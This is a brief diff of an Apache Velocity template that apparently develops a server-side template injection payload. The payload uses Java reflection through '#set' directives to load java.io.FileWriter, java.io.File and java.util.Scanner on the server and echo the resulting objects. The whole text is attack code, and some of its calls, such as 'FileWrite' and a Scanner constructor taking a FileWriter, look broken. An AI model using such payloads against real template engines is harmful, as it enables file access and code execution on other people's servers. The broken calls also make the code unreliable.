@@ -3,8 +3,11 @@ $monkey
 #set ($e="exp")
 #set ($a=$e.getClass().forName("java.io.FileWriter"))
 #set ($ab=$e.getClass().forName("java.io.File"))
-#set ($b=$a.FileWrite($ab))
+#set($sc = $e.getClass().forName("java.util.Scanner"))
+#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.FileWriter")))
 $a
 $ab
 $b
+$sc
+$constructor
 $monkey
